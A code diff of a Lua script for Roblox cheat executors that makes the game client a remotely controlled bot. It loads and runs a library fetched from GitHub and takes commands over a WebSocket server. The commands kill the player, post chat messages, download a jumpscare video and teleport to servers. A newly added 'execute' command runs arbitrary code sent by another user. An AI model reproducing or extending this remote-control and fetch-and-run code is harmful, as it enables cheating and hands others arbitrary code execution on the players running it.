@@ -1,10 +1,12 @@
+if getgenv().oldws then
+	getgenv().forceClosing = true
+	getgenv().oldws:Close()
+end
+getgenv().forceClosing = false
 -- Services / Variables
 local connectionManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/Grayy12/EXT/main/connections.lua", true))().new("Id")
 local localPlayer = game:GetService("Players").LocalPlayer
 local httpService = game:GetService("HttpService")
-
--- WebSocket Client
-local ws = WebSocket.connect("ws://localhost:3001/ws")
 
 -- Our connection data
 local userdata = {
@@ -13,46 +15,44 @@ local userdata = {
 	username = localPlayer.Name,
 }
 
-local function sendCmdResponse(success, response)
-	ws:Send(httpService:JSONEncode({
-		action = "cmdresponse",
-		success = success,
-		response = response,
-	}))
-end
-
+local sendCmdResponse
 -- Commands
 local commands = {
-	kill = function(args)
+	kill = function(sender, args)
 		local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
 		local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
 
 		if humanoid and humanoid.Health > 0 then
 			humanoid:TakeDamage(humanoid.MaxHealth)
-			return sendCmdResponse(true, "Killed")
+			return sendCmdResponse(sender, true, "Killed")
 		end
 
-		return sendCmdResponse(false, "Failed to kill")
+		return sendCmdResponse(sender, false, "Failed to kill")
 	end,
 
-	say = function(args)
+	say = function(sender, args)
 		if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
 			local channel: TextChannel = game:GetService("TextChatService").TextChannels.RBXGeneral
 			channel:SendAsync(args.Message)
+			return sendCmdResponse(sender, true, "Successfully sent message")
 		else
 			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(args.Message, "All")
+			return sendCmdResponse(sender, true, "Successfully sent message")
 		end
+
+		return sendCmdResponse(sender, false, "Failed to send message")
 	end,
 
-	jumpscare = function(args)
+	jumpscare = function(sender, args)
 		coroutine.wrap(function()
 			if not writefile or not getcustomasset or not request then
-				return sendCmdResponse(false, "Executor not supported")
+				return sendCmdResponse(sender, false, "Executor not supported")
 			end
+			sendCmdResponse(sender, true, "Successfully executed jumpscare")
 
 			writefile("scream.mp3", request({ Url = "https://github.com/Grayy12/maxhubassets/raw/main/ScreamSfx.mp3", Method = "GET" }).Body)
 
-			writefile("skibidi.webm", request({ Url = "https://github.com/Grayy12/maxhubassets/raw/main/balls.webm", Method = "GET" }).Body)
+			writefile("skibidi.webm", request({ Url = `https://github.com/Grayy12/maxhubassets/raw/main/{args.type == "balls" and "balls" or "skibidi"}.webm`, Method = "GET" }).Body)
 
 			local items = {
 				["_ScreenGui"] = Instance.new("ScreenGui"),
@@ -82,27 +82,60 @@ local commands = {
 			items["_ScreenGui"]:Destroy()
 			delfile("scream.mp3")
 			delfile("skibidi.webm")
-
-			return sendCmdResponse(true, "Success")
 		end)()
 	end,
+
+	teleport = function(sender, args)
+		sendCmdResponse(sender, true, "Successfully joined place")
+		game:GetService("TeleportService"):TeleportToPlaceInstance(args.PlaceId, args.JobId, localPlayer)
+	end,
+
+	execute = function(sender, args)
+		xpcall(function()
+			loadstring(args.Code)()
+			sendCmdResponse(sender, true, "Successfully executed code")
+		end, function(err)
+			sendCmdResponse(sender, false, err)
+		end)
+	end,
 }
--- Send user data so the server knows who we are
-ws:Send(httpService:JSONEncode(userdata))
 
--- Listen for messages
-connectionManager:NewConnection(ws.OnMessage, function(msg)
-	local data = httpService:JSONDecode(msg)
+-- WebSocket Client
+local function connectToServer()
+	local ws = WebSocket.connect("ws://localhost:3001/ws")
+	getgenv().oldws = ws
 
-	if data.action == "run" then
-		local cmd = commands[data.cmd]
-		if cmd then
-			pcall(cmd, data.args)
+	-- Send user data so the server knows who we are
+	ws:Send(httpService:JSONEncode(userdata))
+
+	-- Listen for messages
+	connectionManager:NewConnection(ws.OnMessage, function(msg)
+		local data = httpService:JSONDecode(msg)
+
+		if data.action == "run" then
+			local cmd = commands[data.cmd]
+			if cmd then
+				pcall(cmd, data.sender, data.args)
+			end
 		end
-	end
-end)
+	end)
 
--- Listen for close
-connectionManager:NewConnection(ws.OnClose, function()
-	print("Closed")
-end)
+	-- Listen for close
+	connectionManager:NewConnection(ws.OnClose, function()
+		if not getgenv().forceClosing then
+			pcall(connectToServer)
+		end
+	end)
+
+	sendCmdResponse = function(receiver, success, response)
+		ws:Send(httpService:JSONEncode({
+			action = "cmdresponse",
+			sender = localPlayer.Name,
+			receiver = receiver,
+			success = success,
+			response = response,
+		}))
+	end
+end
+
+pcall(connectToServer)
